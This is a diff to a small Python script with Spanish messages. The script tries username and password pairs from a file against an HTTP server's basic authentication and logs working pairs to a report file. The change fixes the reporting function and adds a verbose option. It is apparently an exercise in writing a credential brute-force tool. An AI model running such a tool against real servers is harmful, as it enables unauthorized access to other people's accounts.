@@ -29,9 +29,11 @@ def checkOptions(options):
         printError('Debes especificar un servidor a atacar.', True)
 
 
-def reportResults(reporte, user, password):
-    with open(reporte,'a'):
-        reporte.write('El siguiente par funciona: %s\t%s \n' % (user,password))
+def reportResults(reporte,verbose = False):
+    with open('reporte.txt','a') as archivo:
+        archivo.write(reporte)
+        if verbose:
+            print(reporte)
     
 
 
@@ -40,7 +42,7 @@ def buildURL(server,port, protocol = 'http'):
     return url
 
 
-def makeRequest(host, credenciales):
+def makeRequest(host, credenciales, opts):
     with open(credenciales, 'r') as cf:
         lines = cf.readlines()
         for line in lines:
@@ -51,7 +53,7 @@ def makeRequest(host, credenciales):
                     response = get(host, auth=(user,password))
                     if response.status_code == 200:
                             reporte = 'El siguiente par funciona: %s\t%s \n' % (user,password)
-                            reportResults(reporte, user, password)
+                            reportResults(reporte, opts.verbose)
                 except ConnectionError:
                     printError('Error en la conexion, tal vez el servidor no esta arriba.',True)
 
@@ -61,7 +63,7 @@ if __name__ == '__main__':
         opts = addOptions()
         checkOptions(opts)
         url = buildURL(opts.server, port = opts.port)
-        makeRequest(url, opts.credentials)
+        makeRequest(url, opts.credentials, opts)
     except Exception as e:
         printError('Ocurrio un error inesperado')
         printError(e, True)
